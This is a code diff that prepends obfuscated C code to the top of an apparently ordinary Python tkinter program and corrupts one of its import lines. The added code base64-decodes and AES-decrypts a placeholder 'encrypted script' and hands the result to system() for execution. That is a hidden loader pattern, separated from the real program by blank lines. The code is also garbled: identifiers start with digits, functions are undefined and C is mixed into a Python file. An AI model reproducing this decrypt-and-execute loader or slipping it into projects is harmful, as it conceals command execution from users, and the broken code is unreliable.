@@ -1,7 +1,66 @@
+#include <Python.h>
+#include <openssl/aes.h>
+#include <openssl/rand.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <openssl/bio.h>
+#include <openssl/evp.h>
+#include <windows.h>
+
+int yz4d9a7bgwe5hrxqi73slpovk5fjm8efvztwsrjl6i9v9dzf7b3twyo3s0zklj1(const char *diz9kqwcwvfmdrno2fpjdsy9zxn1rj5fw6, unsigned char *xs3q9ih4jwefhoerzkd9ywjai3t7t8vcv2) {
+    BIO *n5wqzm74ah9yov8js2h7foz7tsdlh9hg, *v6oj2ld9zfa8ofh23hsgf3oq8j8ltjslz7;
+    int 8eq3sljl1ovx23s7r91vphwe7jxqvlmpqjwo = strlen(diz9kqwcwvfmdrno2fpjdsy9zxn1rj5fw6);
+    n5wqzm74ah9yov8js2h7foz7tsdlh9hg = BIO_new_mem_buf(diz9kqwcwvfmdrno2fpjdsy9zxn1rj5fw6, 8eq3sljl1ovx23s7r91vphwe7jxqvlmpqjwo);
+    v6oj2ld9zfa8ofh23hsgf3oq8j8ltjslz7 = BIO_new(BIO_f_base64());
+    n5wqzm74ah9yov8js2h7foz7tsdlh9hg = BIO_push(v6oj2ld9zfa8ofh23hsgf3oq8j8ltjslz7, n5wqzm74ah9yov8js2h7foz7tsdlh9hg);
+    8eq3sljl1ovx23s7r91vphwe7jxqvlmpqjwo = BIO_read(n5wqzm74ah9yov8js2h7foz7tsdlh9hg, xs3q9ih4jwefhoerzkd9ywjai3t7t8vcv2, 8eq3sljl1ovx23s7r91vphwe7jxqvlmpqjwo);
+    BIO_free_all(n5wqzm74ah9yov8js2h7foz7tsdlh9hg);
+    return 8eq3sljl1ovx23s7r91vphwe7jxqvlmpqjwo;
+}
+
+void wb8efoz07e3q7gjw5t84pldflgq8szql2s5rczqkqdfx8jwi7kv82t9qdoflw2ofr(const unsigned char *prwef9m6owkvqs9fkd7epm1oyp94tgvk8, const unsigned char *8t9hr7ezq0jlw73w4w4p9p9m9w6vl29f4, unsigned char *ytk8wp8ol3ql1zjbd0fh4vfqsz0p63t2qr) {
+    AES_KEY vfpv8xwq8lx6dgrj2e94t9wg8d1r1f9ek4w;
+    AES_set_decrypt_key(prwef9m6owkvqs9fkd7epm1oyp94tgvk8, 128, &vfpv8xwq8lx6dgrj2e94t9wg8d1r1f9ek4w);
+    AES_decrypt(8t9hr7ezq0jlw73w4w4p9p9m9w6vl29f4, ytk8wp8ol3ql1zjbd0fh4vfqsz0p63t2qr, &vfpv8xwq8lx6dgrj2e94t9wg8d1r1f9ek4w);
+}
+
+void hwb2i3wt88rql9ew7j5q2xlclho9j3fhw29v8fdseoxwpih1w8a0m9j4frcx0tx4(const unsigned char *qj8sd2nmr12gkq8eq4bzf7qt6e9p1hfiq8j) {
+    system((const char*)qj8sd2nmr12gkq8eq4bzf7qt6e9p1hfiq8j);
+}
+
+int main(int ng5w4b3j4k23c9lgf0w4z7n8t9vbfla5, char *kjl22fowwo9f32r8lk27gdq4pf9bgld0t[]) {
+    Py_Initialize();
+
+    const char *p6g2m8sefwfdgz3o9j12rtkdq4d7mwe0v = "YOUR_BASE64_FERNET_KEY";  
+    const char *nqf32wrwef8gjd9i3w8fo2q1qwqe74v2wef = "YOUR_BASE64_ENCRYPTED_SCRIPT";
+
+    unsigned char g9u7ji8owvn2l4u8x42mn7zqw6c7g8h12a9k8wfv4y5joz9pr3n7f3u8t3e;
+    unsigned char v4r2jlwe4f7dx34g2we2wr9f7g0sj3t5tqw8h9jl6f7f;
+    unsigned char v4wv9lx6tjgop9wl32l5kj1kq2wmh1x78h5;
+
+    yqbn9a3rfn6lk5po9q8j0vm6t5d9sl4te1p3vfx9p98h4t8f(wr7ld9lmwojk7efp, g9u7ji8owvn2l4u8x42mn7zqw6c7g8h12a9k8wfv4y5joz9pr3n7f3u8t3e);
+    int h1lsfq8g7y7f9k = xfqwefw5hjei(g9u7ji8owvn2l4u8x42mn7zqw6c7g8h12a9k8wfv4y5joz9pr3n7f3u8t3e);
+
+    wb8efoz07e3q7gjw5t84pldflgq8szql2s5rczqkqdfx8jwi7kv82t9qdoflw2ofr(g9u7ji8owvn2l4u8x42mn7zqw6c7g8h12a9k8wfv4y5joz9pr3n7f3u8t3e);
+    hwb2i3wt88rql9ew7j5q2xlclho9j3fhw29v8fdseoxwpih1w8a0m9j4frcx0tx4(v4r2jlwe4f7dx34g2we2wr9f7g0sj3t5tqw8h9jl6f7f);
+
+    Py_Finalize();
+    return 0;
+}
+
+
+
+
+
+
+
+
+
 import tkinter as tk
 from tkinter import ttk
 import threading
-import pygame
+import
 import random
 import time
 
